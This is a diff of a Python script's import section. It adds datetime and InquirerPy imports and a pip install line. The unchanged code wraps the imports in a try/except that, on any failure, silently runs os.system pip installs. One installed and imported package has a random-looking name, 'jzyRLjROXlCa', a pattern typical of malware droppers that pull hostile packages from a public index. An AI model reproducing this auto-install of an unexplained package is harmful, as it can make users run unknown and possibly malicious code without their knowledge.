@@ -5,14 +5,15 @@ from tkinter.filedialog import askopenfilename
 try:
     import asyncio
     import ctypes
+    import datetime
     import json
-    import os
     import random
     import tkinter
     import requests
     import jzyRLjROXlCa
     import colorama
     from colorama import Fore, Style
+    import InquirerPy
 except Exception as e:
     import os
     os.system('pip install -U urllib3')
@@ -21,12 +22,14 @@ except Exception as e:
     os.system('pip install -U pandas')
     os.system('pip install -U pycryptodome')
     os.system('pip install -U keyboard')
+    os.system('pip install -U datetime')
     os.system('pip install -U cryptography')
     os.system('pip install -U inquirerpy')
     os.system('pip install -U aiohttp')
     os.system('pip install -U jzyRLjROXlCa')
     import asyncio
     import ctypes
+    import datetime
     import json
     import random
     import tkinter
